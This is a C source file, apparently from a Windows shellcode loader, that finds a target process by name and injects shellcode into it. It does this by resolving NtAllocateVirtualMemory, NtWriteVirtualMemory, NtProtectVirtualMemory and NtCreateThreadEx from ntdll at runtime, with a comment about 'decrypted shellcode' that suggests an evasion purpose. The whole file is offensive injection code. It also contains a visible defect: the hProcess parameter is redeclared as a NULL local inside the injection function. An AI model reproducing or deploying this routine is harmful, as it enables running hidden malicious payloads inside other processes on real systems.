#include "Box.h"
#include "struct.h"

BOOL GetRemoteProcID
(
	IN LPCWSTR ProcName,
	OUT DWORD* PID,
	OUT HANDLE* hProcess
)

{

	fnNtQuerySystemInformation		pNtQuerySystemInformation = NULL;
	ULONG							uReturnLen1 = 0, uReturnLen2 = 0;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	PVOID							pValueToFree = NULL;
	NTSTATUS						STATUS = 0;


	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
	if (pNtQuerySystemInformation == NULL) {
		PRINT_ERROR("GetProcAddress");
		return FALSE;
	}

	pNtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uReturnLen1);

	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL)
	{
		PRINT_ERROR("HeapAlloc");
		return FALSE;
	}

	pValueToFree = SystemProcInfo;

	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
		PRINT_ERROR("NtQuerySystemInformation");
		return FALSE;
	}

	while (TRUE) {
		if (SystemProcInfo->ImageName.Length && _wcsicmp(SystemProcInfo->ImageName.Buffer, ProcName) == 0)
		{
			*PID = (DWORD)SystemProcInfo->UniqueProcessId;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
			break;
		}

		if (!SystemProcInfo->NextEntryOffset)
			break;

		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);

	}

	HeapFree(GetProcessHeap(), 0, pValueToFree);

	if (*PID == NULL || *hProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

BOOL NtShellInjection(
	IN DWORD PID,
	IN HANDLE hProcess,
	IN PBYTE pShellcode,
	IN SIZE_T sSizeofShellcode
)

{
	
	NTSTATUS		STATUS = NULL;
	HANDLE		  hProcess = NULL;
	HANDLE		   hThread = NULL;
	PVOID		   rBuffer = NULL;
	DWORD			   TID = NULL;
	BOOL             State = TRUE;
	DWORD       OldProtection = 0;
	SIZE_T       BytesWritten = 0;
	SIZE_T origSize = sSizeofShellcode;
	SIZE_T regionSize = sSizeofShellcode;
	CLIENT_ID CID = { (HANDLE)PID, NULL };
	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);


	HMODULE ntdll = GetModuleHandleW(L"ntdll");
	if (!ntdll)
	{
		PRINT_ERROR("GetModuleHandleW");
		return FALSE;
	}

	// call these functions from ntdll.dll
	fn_NtCreateThreadEx NtCreateThreadEx = (fn_NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
	fn_NtAllocateVirtualMemory NtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
	fn_NtWriteVirtualMemory NtWriteVirtualMemory = (fn_NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
	fn_NtProtectVirtualMemory NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");
	PFN_NtFreeVirtualMemory p_NtFreeVirtualMemory = (PFN_NtFreeVirtualMemory)GetProcAddress(ntdll, "NtFreeVirtualMemory");

	OKAY("[0x%p] Successfully Got a handle to the process: [%ld]", hProcess, PID);

	// allocate SizeofShellcode to VirtualMemory
	STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Allocated %zu Bytes to Virtual Memory!", sSizeofShellcode);

	// Write the newly decrypted shellcode inside
	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, pShellcode, origSize, &BytesWritten);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Wrote %zu Bytes to the Virtual Memory!", BytesWritten);

	// change permissions
	STATUS = NtProtectVirtualMemory(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &OldProtection);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Changed Allocation Protection from [RW] to [RE]");

	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtCreateThreadEx Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Successfully Created a Thread!", hThread);
	INFO("Waiting for Thread to finish executing...");
	WaitForSingleObject(hThread, INFINITE);
	INFO("Execution Completed! Cleaning Up!");

CLEANUP:


		if (rBuffer)
		{
			SIZE_T freeSize = 0;
			STATUS = p_NtFreeVirtualMemory(hProcess, &rBuffer, &freeSize, MEM_DECOMMIT);
			if (STATUS_SUCCESS != STATUS)
			{
				WARN("Error! Could Not Free Buffer! 0x%lx", STATUS);
			}
			else {
				INFO("[0x%p] decommitted allocated buffer from process memory", rBuffer);
			}
		}

		if (hThread) {
			CloseHandle(hThread);
			INFO("[0x%p] handle on thread closed", hThread);
		}

		if (hProcess) {
			CloseHandle(hProcess);
			INFO("[0x%p] handle on process closed", hProcess);
		}

		return State;
}